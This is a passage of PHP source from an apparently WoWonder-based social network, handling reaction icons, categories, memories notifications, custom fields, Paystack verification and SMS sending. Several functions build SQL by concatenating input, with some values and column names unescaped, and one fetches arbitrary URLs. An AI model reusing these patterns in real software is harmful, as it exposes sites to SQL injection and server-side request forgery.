                if (!empty($fetched_data["wowonder_icon"])) {
                    $fetched_data["wowonder_icon"] = $fetched_data["wowonder_small_icon"] = NRG_GetMedia($fetched_data["wowonder_icon"]);
                    // $explode2  = @end(explode('.', $fetched_data['wowonder_icon']));
                    // $explode3  = @explode('.', $fetched_data['wowonder_icon']);
                    // $fetched_data['wowonder_small_icon'] = $explode3[0] . '_small.' . $explode2;
                    $fetched_data["is_html"]       = 0;
                } else {
                    if ($fetched_data["id"] == 1) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--like"><div class="emoji__hand"><div class="emoji__thumb"></div></div></div>';
                    }
                    if ($fetched_data["id"] == 2) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--love"><div class="emoji__heart"></div></div>';
                    }
                    if ($fetched_data["id"] == 3) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--haha"><div class="emoji__face"><div class="emoji__eyes"></div><div class="emoji__mouth"><div class="emoji__tongue"></div></div></div></div>';
                    }
                    if ($fetched_data["id"] == 4) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--wow"><div class="emoji__face"><div class="emoji__eyebrows"></div><div class="emoji__eyes"></div><div class="emoji__mouth"></div></div></div>';
                    }
                    if ($fetched_data["id"] == 5) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--sad"><div class="emoji__face"><div class="emoji__eyebrows"></div><div class="emoji__eyes"></div><div class="emoji__mouth"></div></div></div>';
                    }
                    if ($fetched_data["id"] == 6) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--angry"><div class="emoji__face"><div class="emoji__eyebrows"></div><div class="emoji__eyes"></div><div class="emoji__mouth"></div></div></div>';
                    }
                    $fetched_data["wowonder_small_icon"] = "";
                    $fetched_data["is_html"]             = 1;
                }
                if (!empty($fetched_data["sunshine_icon"])) {
                    $fetched_data["sunshine_icon"] = $fetched_data["sunshine_small_icon"] = NRG_GetMedia($fetched_data["sunshine_icon"]);
                    // $explode2  = @end(explode('.', $fetched_data['sunshine_icon']));
                    // $explode3  = @explode('.', $fetched_data['sunshine_icon']);
                    // $fetched_data['sunshine_small_icon'] = $explode3[0] . '_small.' . $explode2;
                } else {
                    if ($fetched_data["id"] == 1) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/like.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/like-sm.png";
                    }
                    if ($fetched_data["id"] == 2) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/love.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/love-sm.png";
                    }
                    if ($fetched_data["id"] == 3) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/haha.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/haha-sm.png";
                    }
                    if ($fetched_data["id"] == 4) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/wow.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/wow-sm.png";
                    }
                    if ($fetched_data["id"] == 5) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/sad.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/sad-sm.png";
                    }
                    if ($fetched_data["id"] == 6) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/angry.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["site_url"] . "/themes/sunshine/reaction/angry-sm.png";
                    }
                }
                // if (!empty($fetched_data['wowonder_icon']) && !empty($fetched_data['sunshine_icon'])) {
                //     $fetched_data['sunshine_icon'] = NRG_GetMedia($fetched_data['sunshine_icon']);
                //     $fetched_data['wowonder_icon'] = NRG_GetMedia($fetched_data['wowonder_icon']);
                // }
                // else{
                //     //if (!file_exists('./themes/' . $nrg['config']['theme'] . '/reaction/like-sm.png')) {
                //         if ($fetched_data['id'] == 1) {
                //             $fetched_data['wowonder_icon'] = '<div class="emoji emoji--like"><div class="emoji__hand"><div class="emoji__thumb"></div></div></div>';
                //         }
                //         if ($fetched_data['id'] == 2) {
                //             $fetched_data['wowonder_icon'] = '<div class="emoji emoji--love"><div class="emoji__heart"></div></div>';
                //         }
                //         if ($fetched_data['id'] == 3) {
                //             $fetched_data['wowonder_icon'] = '<div class="emoji emoji--haha"><div class="emoji__face"><div class="emoji__eyes"></div><div class="emoji__mouth"><div class="emoji__tongue"></div></div></div></div>';
                //         }
                //         if ($fetched_data['id'] == 4) {
                //             $fetched_data['wowonder_icon'] = '<div class="emoji emoji--wow"><div class="emoji__face"><div class="emoji__eyebrows"></div><div class="emoji__eyes"></div><div class="emoji__mouth"></div></div></div>';
                //         }
                //         if ($fetched_data['id'] == 5) {
                //             $fetched_data['wowonder_icon'] = '<div class="emoji emoji--sad"><div class="emoji__face"><div class="emoji__eyebrows"></div><div class="emoji__eyes"></div><div class="emoji__mouth"></div></div></div>';
                //         }
                //         if ($fetched_data['id'] == 6) {
                //             $fetched_data['wowonder_icon'] = '<div class="emoji emoji--angry"><div class="emoji__face"><div class="emoji__eyebrows"></div><div class="emoji__eyes"></div><div class="emoji__mouth"></div></div></div>';
                //         }
                //    // }
                //     //else{
                //         if ($fetched_data['id'] == 1) {
                //             $fetched_data['sunshine_icon'] = $nrg['config']['theme_url']."/reaction/like.gif";
                //         }
                //         if ($fetched_data['id'] == 2) {
                //             $fetched_data['sunshine_icon'] = $nrg['config']['theme_url']."/reaction/love.gif";
                //         }
                //         if ($fetched_data['id'] == 3) {
                //             $fetched_data['sunshine_icon'] = $nrg['config']['theme_url']."/reaction/haha.gif";
                //         }
                //         if ($fetched_data['id'] == 4) {
                //             $fetched_data['sunshine_icon'] = $nrg['config']['theme_url']."/reaction/wow.gif";
                //         }
                //         if ($fetched_data['id'] == 5) {
                //             $fetched_data['sunshine_icon'] = $nrg['config']['theme_url']."/reaction/sad.gif";
                //         }
                //         if ($fetched_data['id'] == 6) {
                //             $fetched_data['sunshine_icon'] = $nrg['config']['theme_url']."/reaction/angry.gif";
                //         }
                //     //}
                // }
            }
            $data[$fetched_data["id"]] = $fetched_data;
        }
        return $data;
    }
    return $data;
}
function NRG_GetCategories($table) {
    global $sqlConnect, $nrg;
    $data       = array();
    $categories = mysqli_query($sqlConnect, "SELECT * FROM " . $table);
    if (mysqli_num_rows($categories)) {
        while ($fetched_data = mysqli_fetch_assoc($categories)) {
            $data[$fetched_data["id"]] = $nrg["lang"][$fetched_data["lang_key"]];
        }
        if ($table == "wo_products_categories") {
            $data[0] = $nrg["lang"]["all_"];
        } else {
            $data[1] = $nrg["lang"]["other"];
        }
        return $data;
    }
    return false;
}
function NRG_GetCategoriesKeys($table) {
    global $sqlConnect, $nrg;
    $data       = array();
    $categories = mysqli_query($sqlConnect, "SELECT * FROM " . $table);
    if (mysqli_num_rows($categories)) {
        while ($fetched_data = mysqli_fetch_assoc($categories)) {
            $data[$fetched_data["id"]] = $fetched_data["lang_key"];
        }
        if ($table == "wo_products_categories") {
            $data[0] = "all_";
        } else {
            $data[1] = "other";
        }
        return $data;
    }
    return false;
}
function NRG_GetPokeById($id) {
    global $sqlConnect, $nrg;
    if (empty($id) || !is_numeric($id) || $id < 1) {
        return false;
    }
    $data      = array();
    $query_one = mysqli_query($sqlConnect, "SELECT * FROM " . T_POKES . " WHERE `id` = '{$id}'");
    if (mysqli_num_rows($query_one)) {
        while ($fetched_data = mysqli_fetch_assoc($query_one)) {
            $fetched_data["user_data"] = NRG_UserData($fetched_data["received_user_id"]);
            $data                      = $fetched_data;
        }
    }
    return $data;
}
function NRG_GetAllColors() {
    global $sqlConnect, $nrg, $db;
    $data      = array();
    $query_one = $db->get(T_COLORS);
    if ($query_one) {
        foreach ($query_one as $key => $fetched_data) {
            $data["" . $fetched_data->id . ""] = $fetched_data;
        }
    }
    return $data;
}
function NRG_GetMemoriesPosts($user_id) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    // $year = date('Y')-1;
    // $start_time = strtotime(date('d').' '.date('F').' '.$year.' 12:00am');
    // $end_time = strtotime(date('d').' '.date('F').' '.$year.' 11:59pm');
    $day       = date("d");
    $month     = date("n");
    $year      = date("Y") - 1;
    $user_id   = NRG_Secure($user_id);
    $data      = array();
    //$query_one = "SELECT `post_id` FROM " . T_POSTS . " WHERE `user_id` = {$user_id} AND `time` >= '{$start_time}' AND `time` <= '{$end_time}'";
    $query_one = "SELECT `post_id` FROM " . T_POSTS . " WHERE `user_id` = '{$user_id}' AND DAY(FROM_UNIXTIME(time)) = '{$day}' AND MONTH(FROM_UNIXTIME(time)) = '{$month}' AND YEAR(FROM_UNIXTIME(time)) = '{$year}'";
    $query     = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($query)) {
        while ($fetched_data = mysqli_fetch_assoc($query)) {
            $post = NRG_PostData($fetched_data["post_id"]);
            if (is_array($post)) {
                $data[] = $post;
            }
        }
    }
    return $data;
}
function NRG_GetMemoriesFreinds($user_id) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $day       = date("d");
    $month     = date("n");
    $year      = date("Y") - 1;
    $user_id   = NRG_Secure($user_id);
    $data      = array();
    $query_one = " SELECT `user_id`,b.`time` FROM " . T_USERS . " a," . T_FOLLOWERS . " b WHERE a.`user_id` IN (SELECT `follower_id` FROM " . T_FOLLOWERS . " WHERE `follower_id` <> {$user_id} AND `following_id` = {$user_id} AND `active` = '1' AND  DAY(FROM_UNIXTIME(time)) = '{$day}' AND MONTH(FROM_UNIXTIME(time)) = '{$month}') AND YEAR(FROM_UNIXTIME(time)) = '{$year}' AND a.`active` = '1' GROUP BY a.`user_id`";
    $query     = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($query)) {
        while ($fetched_data = mysqli_fetch_assoc($query)) {
            $user         = NRG_UserData($fetched_data["user_id"]);
            $user["time"] = $fetched_data["time"];
            if (is_array($user)) {
                $data[] = $user;
            }
        }
    }
    return $data;
}
function NRG_AddNotifyMemories() {
    global $nrg, $sqlConnect, $db;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id   = $nrg["user"]["id"];
    $day       = date("d");
    $month     = date("n");
    $year      = date("Y");
    $query_one = " SELECT COUNT(*) AS count FROM " . T_NOTIFICATION . " WHERE `recipient_id` = " . $user_id . " AND DAY(FROM_UNIXTIME(time)) = '{$day}' AND MONTH(FROM_UNIXTIME(time)) = '{$month}' AND YEAR(FROM_UNIXTIME(time)) = '{$year}' AND `type` = 'memory'";
    $query     = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($query)) {
        $fetched_data = mysqli_fetch_assoc($query);
        $notify       = false;
        if ($fetched_data["count"] < 1) {
            $friends = NRG_GetMemoriesFreinds($user_id);
            if (count($friends) < 1) {
                $posts = NRG_GetMemoriesPosts($user_id);
                if (count($posts) < 1) {
                    $notify = false;
                } else {
                    $notify = true;
                }
            } else {
                $notify = true;
            }
        }
        if ($notify == true) {
            $db->insert(T_NOTIFICATION, array(
                "recipient_id" => $nrg["user"]["id"],
                "type" => "memory",
                "text" => $nrg["lang"]["memory_this_day"],
                "url" => "index.php?link1=memories",
                "time" => time()
            ));
        }
    }
    return false;
}
function NRG_GetSubCategories() {
    global $sqlConnect, $nrg;
    $nrg["page_sub_categories"]     = array();
    $nrg["group_sub_categories"]    = array();
    $nrg["products_sub_categories"] = array();
    $categories                    = mysqli_query($sqlConnect, "SELECT * FROM " . T_SUB_CATEGORIES);
    if (mysqli_num_rows($categories)) {
        while ($fetched_data = mysqli_fetch_assoc($categories)) {
            if ($fetched_data["type"] == "page") {
                $fetched_data["lang"]                                      = $nrg["lang"][$fetched_data["lang_key"]];
                $nrg["page_sub_categories"][$fetched_data["category_id"]][] = $fetched_data;
            }
            if ($fetched_data["type"] == "group") {
                $fetched_data["lang"]                                       = $nrg["lang"][$fetched_data["lang_key"]];
                $nrg["group_sub_categories"][$fetched_data["category_id"]][] = $fetched_data;
            }
            if ($fetched_data["type"] == "product") {
                $fetched_data["lang"]                                          = $nrg["lang"][$fetched_data["lang_key"]];
                $nrg["products_sub_categories"][$fetched_data["category_id"]][] = $fetched_data;
            }
        }
        return true;
    }
    return false;
}
function NRG_GetCustomFields($type = "all") {
    global $nrg, $sqlConnect;
    $data       = array();
    $where      = "";
    $placements = array(
        "page",
        "group",
        "product"
    );
    $type       = NRG_Secure($type);
    if ($type != "all" && in_array($type, $placements)) {
        $where = "WHERE `placement` = '{$type}' ";
    }
    $query_one = "SELECT * FROM " . T_CUSTOM_FIELDS . " {$where} ORDER BY `id` ASC";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $fetched_data["fid"] = "fid_" . $fetched_data["id"];
            $fetched_data["name"] = preg_replace_callback("/{{LANG (.*?)}}/", function($m) use ($nrg) {
                return isset($nrg["lang"][$m[1]]) ? $nrg["lang"][$m[1]] : "";
            }, $fetched_data["name"]);
            $fetched_data["description"] = preg_replace_callback("/{{LANG (.*?)}}/", function($m) use ($nrg) {
                return isset($nrg["lang"][$m[1]]) ? $nrg["lang"][$m[1]] : "";
            }, $fetched_data["description"]);
            $fetched_data["options"] = preg_replace_callback("/{{LANG (.*?)}}/", function($m) use ($nrg) {
                return isset($nrg["lang"][$m[1]]) ? $nrg["lang"][$m[1]] : "";
            }, $fetched_data["options"]);
            $data[]                  = $fetched_data;
        }
    }
    return $data;
}
function NRG_RegisterNewCustomField($registration_data) {
    global $nrg, $sqlConnect;
    if (empty($registration_data)) {
        return false;
    }
    $fields = "`" . implode("`, `", array_keys($registration_data)) . "`";
    $data   = '\'' . implode('\', \'', $registration_data) . '\'';
    $query  = mysqli_query($sqlConnect, "INSERT INTO " . T_CUSTOM_FIELDS . " ({$fields}) VALUES ({$data})");
    if ($query) {
        $sql_id      = mysqli_insert_id($sqlConnect);
        $column      = "fid_" . $sql_id;
        $length      = $registration_data["length"];
        $types_array = array(
            "page" => T_PAGES,
            "group" => T_GROUPS,
            "product" => T_PRODUCTS
        );
        $query_2     = mysqli_query($sqlConnect, "ALTER TABLE " . $types_array[$registration_data["placement"]] . " ADD COLUMN `{$column}` varchar({$length}) NOT NULL DEFAULT ''");
        return true;
    }
    return false;
}
function NRG_DeleteCustomField($id, $type) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (NRG_IsAdmin() === false) {
        return false;
    }
    $types_array = array(
        "page" => T_PAGES,
        "group" => T_GROUPS,
        "product" => T_PRODUCTS
    );
    $id          = NRG_Secure($id);
    $type        = NRG_Secure($type);
    $query       = mysqli_query($sqlConnect, "DELETE FROM " . T_CUSTOM_FIELDS . " WHERE `id` = {$id} AND `placement` = '{$type}'");
    if ($query) {
        $query2 = mysqli_query($sqlConnect, "ALTER TABLE " . $types_array[$type] . " DROP `fid_{$id}`;");
        if ($query2) {
            return true;
        }
    }
    return false;
}
function NRG_UpdateCustomField($id, $update_data) {
    global $nrg, $sqlConnect, $cache;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id) || !is_numeric($id) || $id < 0) {
        return false;
    }
    if (empty($update_data)) {
        return false;
    }
    $id = NRG_Secure($id);
    if (NRG_IsAdmin() === false) {
        return false;
    }
    $update      = array();
    $types_array = array(
        "page" => T_PAGES,
        "group" => T_GROUPS,
        "product" => T_PRODUCTS
    );
    foreach ($update_data as $field => $data) {
        $update[] = "`" . $field . '` = \'' . NRG_Secure($data, 0) . '\'';
        if ($field == "length") {
            $mysqli = mysqli_query($sqlConnect, "ALTER TABLE " . $types_array[$update_data["placement"]] . " CHANGE `fid_{$id}` `fid_{$id}` VARCHAR(" . NRG_Secure($data) . ") CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL DEFAULT '';");
        }
    }
    $impload   = implode(", ", $update);
    $query_one = "UPDATE " . T_CUSTOM_FIELDS . " SET {$impload} WHERE `id` = {$id} ";
    $query     = mysqli_query($sqlConnect, $query_one);
    if ($query) {
        return true;
    }
    return false;
}
function NRG_CheckPaystackPayment($ref) {
    global $nrg, $db;
    if (empty($ref) || $nrg["loggedin"] == false) {
        return false;
    }
    $ref  = NRG_Secure($ref);
    $result = array();
    //The parameter after verify/ is the transaction reference to be verified
    $url    = "https://api.paystack.co/transaction/verify/" . $ref;
    $ch     = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Authorization: Bearer " . $nrg["config"]["paystack_secret_key"]
    ));
    $request = curl_exec($ch);
    curl_close($ch);
    if ($request) {
        $result = json_decode($request, true);
        if ($result) {
            if ($result["data"]) {
                if ($result["data"]["status"] == "success") {
                    return true;
                } else {
                    die("Transaction was not successful: Last gateway response was: " . $result["data"]["gateway_response"]);
                }
            } else {
                die($result["message"]);
            }
        } else {
            die("Something went wrong while trying to convert the request variable to json. Uncomment the print_r command to see what is in the result variable.");
        }
    } else {
        die("Something went wrong while executing curl. Uncomment the var_dump line above this line to see what the issue is. Please check your CURL command to make sure everything is ok");
    }
}
function IsSaveUrl($url) {
    if (empty($url)) {
        return array(
            "status" => 400
        );
    }
    $headers = array();
    $ch      = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    //curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 20);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    // Only calling the head
    curl_setopt($ch, CURLOPT_HEADER, true); // header will be at output
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_HEADERFUNCTION, function($curl, $header) use (&$headers) {
        $len    = strlen($header);
        $header = explode(":", $header, 2);
        if (count($header) < 2) {
            // ignore invalid headers
            return $len;
        }
        $headers[strtolower(trim($header[0]))][] = trim($header[1]);
        return $len;
    });
    $content = curl_exec($ch);
    curl_close($ch);
    if (!empty($headers["content-type"])) {
        if (strpos($headers["content-type"][0], "/html")) {
            return array(
                "status" => 200,
                "type" => "html"
            );
        }
        if (strpos($headers["content-type"][0], "image/") === 0) {
            return array(
                "status" => 200,
                "type" => "image"
            );
        }
    }
    return array(
        "status" => 400
    );
}
function send_bulksms_message ( $post_body, $url, $username, $password) {
  $ch = curl_init( );
  $headers = array(
  'Content-Type:application/json',
  'Authorization:Basic '. base64_encode("$username:$password")
  );
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt ( $ch, CURLOPT_URL, $url );
  curl_setopt ( $ch, CURLOPT_POST, 1 );
  curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, 1 );
  curl_setopt ( $ch, CURLOPT_POSTFIELDS, $post_body );
  // Allow cUrl functions 20 seconds to execute
  curl_setopt ( $ch, CURLOPT_TIMEOUT, 20 );
  // Wait 10 seconds while trying to connect
  curl_setopt ( $ch, CURLOPT_CONNECTTIMEOUT, 10 );
  $output = array();
  $output['server_response'] = curl_exec( $ch );
  $curl_info = curl_getinfo( $ch );
  $output['http_status'] = $curl_info[ 'http_code' ];
  $output['error'] = curl_error($ch);
  curl_close( $ch );
  return $output;
}
